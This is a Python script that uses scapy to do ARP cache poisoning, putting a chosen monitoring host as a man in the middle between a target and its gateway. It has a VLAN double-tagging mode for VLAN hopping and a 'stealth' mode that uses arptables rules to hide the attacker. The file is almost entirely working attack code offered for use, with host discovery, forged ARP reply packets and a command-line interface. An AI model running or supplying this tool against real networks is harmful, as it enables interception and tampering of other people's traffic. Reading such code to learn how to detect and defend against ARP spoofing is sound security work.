"""Choice of attacking tool to be used within 1A

Attributes:
    ARP_DISCOVERY_DEF_TIMEOUT (int): The amount of time to wait to receive
    									replies from ARP Ping
    BRDCAST_MAC (str): Contant broadcast MAC address
    G_IS_POISONED (bool): Description
    INVALID_VLAN_NO (int): Indicator of invalid vlan number
"""
import argparse

import os
from scapy.all import *
from tabulate import tabulate
import time


BRDCAST_MAC = "ff:ff:ff:ff:ff:ff"
ARP_DISCOVERY_DEF_TIMEOUT = 15
INVALID_VLAN_NO = -1

G_IS_POISONED = False

class StealthModule:

	"""Prevents other hosts from discovering you attacking
	
	Attributes:
	    is_blocked (bool): Description
	    SAVE_FILE (str): Description
	"""

	SAVE_FILE = "arp-tables-result.save"
	def __init__(self):
		"""Checks if running in Linux then start stealthing
		
		Returns:
		    TYPE: Description
		
		Raises:
		    e: Description
		    Exception: Description
		"""
		import platform

		self.is_blocked = False

		if platform.system() != "Linux":
			raise Exception("This stealth function only works only on Linux OS")
			return 


		try:
			self._save_arp_tables_state()
			self._flush_arp_table_state()
			self._block_arp()
			self.is_blocked = True
		except Exception as e:
			raise e

	def _save_arp_tables_state(self):
		os.system("arptables-save > %s" %self.SAVE_FILE)

	def _flush_arp_table_state(self):
		os.system("arptables -F")

	def _block_arp(self):
		os.system("arptables -P INPUT DROP")

	def _reset_arp_state(self):

		if self.is_blocked:
			print("Resetting arp-tables state")
			os.system("arptables-restore < %s" %self.SAVE_FILE)
	
	def __exit__(self, type, value, traceback):
		self._reset_arp_state()

	def __del__(self):
		self._reset_arp_state()


class NetworkUtility:

	"""This class contains utilities which will be required by 
	other modules to conduct their attacks.
	"""

	@staticmethod
	def send_recv_arp_broadcast(ip_address, timeout_dura=ARP_DISCOVERY_DEF_TIMEOUT, retry=-2):
		"""Used within get_network_details
			for network discovery
		
		Args:
		    ip_address (str): IP address e.g 192.168.1.0
		    timeout_dura (int, optional): ARP Ping wait duration
		
		Returns:
		    TYPE: Returns the packets in the form of two variables answers, unanswered
		"""
		return srp(Ether(dst=BRDCAST_MAC)/ARP(op=1, pdst=ip_address), timeout=timeout_dura, verbose=False)

	@staticmethod
	def get_network_details(network, timeout_dura):
		"""Outputs the above arp ping function
			in a table to retrieve all IP addresses
			withs MAC addresses.
		
		Args:
		    network (str): Network ID address with subnetmask in slash 10.1.1.0/24
		    timeout_dura (int): ARP Ping wait duration
		
		Returns:
		    str: Output in a string format 
		"""
		ans, unans = NetworkUtility.send_recv_arp_broadcast(network, timeout_dura)

		if (len(ans) > 0):
			tbl_data = [[rcv.sprintf(r"%ARP.psrc%"), rcv.sprintf(r"%Ether.src%")] for snd, rcv in ans]
			return tabulate(tbl_data, headers=['IP Address', 'MAC Address'])
		else:
			return None



class Poisoner:

	"""This class is a package of functionalities
	
	
	Attributes:
	    ARP_SEND_DELAY (int): Time to wait after sending each packet
	    gateway_ip (str): Attacker 2 IP or usually the Gateway's IP
	    IS_VALID_VLAN_NO (int): To check if vlan number is within valid range
	    monitor_ip (str): The PC's IP which will be the man in the middle
	    PKT_poison_1 (obj): Poison packet for Attacker 1
	    PKT_poison_2 (obj): Poison packet for GW
	    PKT_unpoison_1 (obj): Packet unpoison attacker1 after finished
	    PKT_unpoison_2 (obj): Packet unpoison attacker2 after finished	    
	    target_ip (str): Target's PC IP Address
	    vlan_num_1 (int): VLAN number 1 for double tagging
	    vlan_num_2 (int): VLAN number 2 for double tagging
	"""
	
	# https://tools.ietf.org/html/rfc5227#page-7
	
	# Minimum interval between defensive ARPs IS 10 seconds 
	# therefore we set the arp delay to 10 to reduce spamming of ARP.	
	ARP_SEND_DELAY = 10

	SEND_TYPE_NORM = 1
	SEND_TYPE_VLAN = 2
	# Dont use 1002 to 1005 since they are reserved			
	IS_VALID_VLAN_NO = lambda self, x: 1 <= x <= 1001 or 1006 <= x <= 4094

	def __init__(self, target_ip, monitor_ip, gateway_ip, vlan_num_1, vlan_num_2):
		"""Initializes all relevant variables and input validation of VLAN input
		
		Args:
		    target_ip (str): 	Target's PC IP Address
		    monitor_ip (str): 	Middle Man's IP
		    gateway_ip (str): 	Target2 or Gateway's IP
		    vlan_num_1 (int): 	VLAN number 1 for double tagging
	    	vlan_num_2 (int): VLAN number 2 for double tagging

		Raises:
		    TypeError: IF Vlan mode is specified by has invalid range	
		"""
		if (vlan_num_1 != INVALID_VLAN_NO) and (vlan_num_2 != INVALID_VLAN_NO):
			if not self.IS_VALID_VLAN_NO(int(vlan_num_1)) or not self.IS_VALID_VLAN_NO(int(vlan_num_2)):
				raise TypeError("VLAN Numbers can be only 1 - 1001 and 1006 - 4094")
						

		self.target_ip = target_ip
		self.monitor_ip = monitor_ip
		self.gateway_ip = gateway_ip

		self.vlan_num_1 = vlan_num_1
		self.vlan_num_2 = vlan_num_2		

		self.PKT_poison_1 = None
		self.PKT_poison_2 = None

		self.PKT_unpoison_1 = None 
		self.PKT_unpoison_2 = None


	def _is_valid_vlans(self):
		return self.vlan_num_1 is not INVALID_VLAN_NO and self.vlan_num_2 is not INVALID_VLAN_NO


	def _get_mac_from_ip(self, ip_address):
		"""Uses ARP Ping to get MAC address of the particular 
			ip address
		
		Args:
		    ip_address (str): IP address input
		
		Returns:
		    str: Retuns MAC address in the form of string
		"""
		# resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=3, verbose=False)
		resp, unans = NetworkUtility.send_recv_arp_broadcast(ip_address)
		for s,r in resp:
			return r[ARP].hwsrc
		return None


	"""	- hwsrc is the MAC corresponding to psrc, to update in the target's arp table
		- pdst is where the ARP packet should go (target),
		- psrc is the IP to update in the target's arp table,
		- hwdst is the destination hardware address
	"""	 
	def _generate_poison_packets(self, target_mac, monitor_mac, gateway_mac):
		"""Generate two packets to conduct poisoning
		One packet each for target and gateway
		
		Args:
		    target_mac (str): Target's MAC address
		    monitor_mac (str): MAAN in middle's MAC Address
		    gateway_mac (str): Gateway/Target2 MAC Address
		"""

		#Tell target Gateway IP has Monitor MAC!
		self.PKT_poison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=monitor_mac)
  
		#Tell gateway that target IP has Monitor MAC!
		self.PKT_poison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=monitor_mac)


	def _generate_unpoison_packets(self, target_mac, monitor_mac, gateway_mac):
		"""
		Args:
		    target_mac (str): Target's MAC address
		    monitor_mac (str): MAAN in middle's MAC Address
		    gateway_mac (str): Gateway/Target2 MAC Address
		"""
		# Lie to target to make Gateway IP back to Gateway Mac :(
		self.PKT_unpoison_1 = ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gateway_mac)

		# Lie to target to make Target IP back to Target Mac :(
		self.PKT_unpoison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=target_mac)

			
	def double_tag_poison_packets(self, target_mac, gateway_mac):
		"""Summary
		"""
		self.PKT_poison_1  = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_1

		self.PKT_poison_2 = Ether(dst=gateway_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_2

	def double_tag_unpoison_packets(self, target_mac, gateway_mac):
		"""Summary
		"""
		self.PKT_unpoison_1 = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_1

		self.PKT_unpoison_2 = Ether(dst=gateway_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_2

	def run(self):
		"""Poisoning Mode 1, without VLAN double tagging
		
		Returns:
		    TYPE: Description
		"""
		target_mac = self._get_mac_from_ip(self.target_ip)

		""" Its named as gateway for user to visualise the
			redirection easier. It does not necessarily be
			the gateway. It can be another host
		"""
		gateway_mac = self._get_mac_from_ip(self.gateway_ip)

		# If monitoring IP is set to own computer, then get MAC differently
		if self.monitor_ip == get_if_addr(conf.iface):
			monitor_mac = get_if_hwaddr(conf.iface)
		else:
			monitor_mac = self._get_mac_from_ip(self.monitor_ip)
		
		missing = ""

		if target_mac is None:
			missing += "No MAC found for {}.\n".format(self.target_ip)
			
		if monitor_mac is None:
			missing += "No MAC found for {}.\n".format(self.monitor_ip)

		if gateway_mac is None:
			missing += "No MAC found for {}.\n".format(self.gateway_ip)

		if missing != "":
			print(missing)
			sys.exit()


		print("Target: {} , Monitor: {}, Gateway: {} ".format(target_mac, monitor_mac, gateway_mac))

		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)

		self.PKT_poison_1.show()
		self.PKT_poison_2.show()

		try:
			#  Start poisoining
			print("[*] Starting Normal Poisoning...")
			while True:				
				send(self.PKT_poison_1, verbose=False)
				send(self.PKT_poison_2, verbose=False)

				# Abide to RFC
				time.sleep(self.ARP_SEND_DELAY)
			
		except KeyboardInterrupt:
			# Unpoison if Ctrl-C 
			print("[*] Keyboard interupted... restoring ARP Cache")
			self._unpoison_victims(type=self.SEND_TYPE_NORM)
			print("[*] Finished reseting gateway and target")

		finally:
			return 0

	def _unpoison_victims(self, type=1):
		"""Unpoisoning procedure 
		"""
		if type == 2:			
			for i in range(3):
				send(self.PKT_unpoison_1, verbose=False)
				send(self.PKT_unpoison_2, verbose=False)

			for i in range(3):
				sendp(self.PKT_unpoison_1, verbose=False)
				sendp(self.PKT_unpoison_2, verbose=False)

	def run_vlan_poison(self, target_mac, monitor_mac, gateway_mac):
		"""ARP Poison mode 2, whihc includes VLAN hopping
		functionality through double tagging
		
		Args:
		    target_mac (str): Target's MAC Address
		    monitor_mac (str): Monitoring PC's MAC Address
		    gateway_mac (str): Gateway/Target2's MAC Address
		
		Returns:
		    int: Return finished Code
		"""
		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)

		self.double_tag_poison_packets(target_mac, gateway_mac)
		self.double_tag_unpoison_packets(target_mac, gateway_mac)


		try:
		#  Start poisoining
			print("[*] Starting Double Tagged Poisoning...")
			while True:
				sendp(self.PKT_poison_1, verbose=False)
				sendp(self.PKT_poison_2, verbose=False)
		
		except KeyboardInterrupt:
			# Unpoison if Ctrl-C 
			print("[*] Keyboard interupted... restoring ARP Cache")
			self._unpoison_victims(type=self.SEND_TYPE_VLAN)
			print("[*] Finished reseting gateway and target")
		finally:
			return 0

	def _cleanup_poison(self):
		if G_IS_POISONED:
			self._unpoison_victims()

	def __exit__(self, type, value, traceback):
		self._cleanup_poison()

	def __del__(self):
		self._cleanup_poison()
		

class ArgParser(argparse.ArgumentParser):

	""" Simple argument parsing to cater to different funcctions
	"""

	def __init__(self):
		self.stealth = None
	
	def error(self, message):
		"""Override error function
		
		Args:
		    message (str): Error message to print out
		"""
		sys.stderr.write('error: %s\n' % message)
		self.print_help()
		sys.exit(2)

	def __init__(self):
		"""Summary
		"""
		self.parser = argparse.ArgumentParser(description="This is an ARP poisoning script")
		self.parser.add_argument('-l', dest='network', help='Lists all IP & MAC Addresses for particular subnet. E.g -l 192.168.1.0/24', action='store')		
		self.parser.add_argument('--stealth', dest='stealth', help='Configures this host machine to not reply all ARP packets. *Only for linux', action='store_true')		
		self.parser.add_argument('-P', dest='arp_poison', help='ARP Poisoning for network redirection and monitoring.', action='store_true')		
		self.parser.add_argument('-PV', dest='arp_poison_vlan', help='ARP Poisoning for network redirection and monitoring with Double Tagging.', action='store_true')		
		self.parser.add_argument('-T', dest='target_ip', help='*For -P or -PV Target\'s IP address.', action='store')
		self.parser.add_argument('-M', dest='monitoring_ip', help='*For -P* or -PV Monitoring PC\'s IP address.', action='store')
		self.parser.add_argument('-G', dest='gateway_ip', help='*For -P or -PV Gateway\'s IP address.', action='store')

		self.parser.add_argument('-TM', dest='target_mac', help='*For -PV* Target\'s MAC Address1.', action='store')
		self.parser.add_argument('-MM', dest='monitoring_mac', help='*For -PV* Monitoring PC\'s MAC Address1.', action='store')
		self.parser.add_argument('-GM', dest='gateway_mac', help='*For -PV* Gateway\'s MAC Address1.', action='store')

		self.parser.add_argument('--vlan1', dest='vlan1_num', help='*For -PV* Specify VLAN Number for first 802.1q TAG' , action='store')
		self.parser.add_argument('--vlan2', dest='vlan2_num', help='*For -PV* Specify VLAN Number for second 802.1q TAG', action='store')



	def check_required_args(self, arg_obj):

		error_msg = "\n"
		if arg_obj.target_ip is None:
			error_msg += "[-T] is required\n"

		if arg_obj.monitoring_ip is None:
			error_msg += "[-M] Monitoring IP param is required\n"

		if arg_obj.gateway_ip is None:
			error_msg += "[-GW] Gateway is required\n"
		return error_msg
		
	def check_vlan_args(self, arg_obj):

		error_msg = self.check_required_args(arg_obj)

		if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is None:
			error_msg += "[--vlan2] Please specified vlan2 number\n"				

		if arg_obj.vlan1_num is  None and arg_obj.vlan2_num is not  None:
			error_msg += "[--vlan1] Please specified vlan1 number\n"

		# if arg_obj.vlan1_num is not None and arg_obj.vlan2_num is not None:
		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan1_num):
		# 		error_msg += "[--vlan1] Invalid VLAN Tag 1\n"

		# 	if not self.IS_VALID_VLAN_NO(arg_obj.vlan2_num):
		# 		error_msg += "[--vlan2] Invalid VLAN Tag 2\n"
		return error_msg


	def parse_arguments(self):
		args = self.parser.parse_args()

		if args.stealth:
			try:				
				self.stealth = StealthModule()
			except Exception as e:
				print(e)

		if args.network:

			details = NetworkUtility.get_network_details(args.network, ARP_DISCOVERY_DEF_TIMEOUT)
			if details is None:
				print("[!] No network details found for {}".format(args.network))
			else:
				print(details)


		elif args.arp_poison:
			error_msg = self.check_required_args(args)

			if error_msg != "\n":
				raise self.parser.error(error_msg)
			else:
				print("All Args Correct", args.target_ip, args.monitoring_ip, args.gateway_ip)

				try:
					if args.vlan1_num is not None and args.vlan2_num is not None:
						poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
					else:
						poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, INVALID_VLAN_NO, INVALID_VLAN_NO)

					poison.run()
				except Exception as e:
					raise e				
				
		elif args.arp_poison_vlan:

			error_msg = self.check_vlan_args(args)
			if error_msg != "\n":
				raise self.parser.error(error_msg)
			else:
				poison = Poisoner(args.target_ip, args.monitoring_ip, args.gateway_ip, args.vlan1_num, args.vlan2_num)
				
			poison.run_vlan_poison(args.target_mac, args.monitoring_mac, args.gateway_mac)
		else:
			self.parser.print_help()
			sys.exit(2)

		if args.stealth and self.stealth is not None:
			del self.stealth

		

if __name__=="__main__":

	A = ArgParser()
	A.parse_arguments()

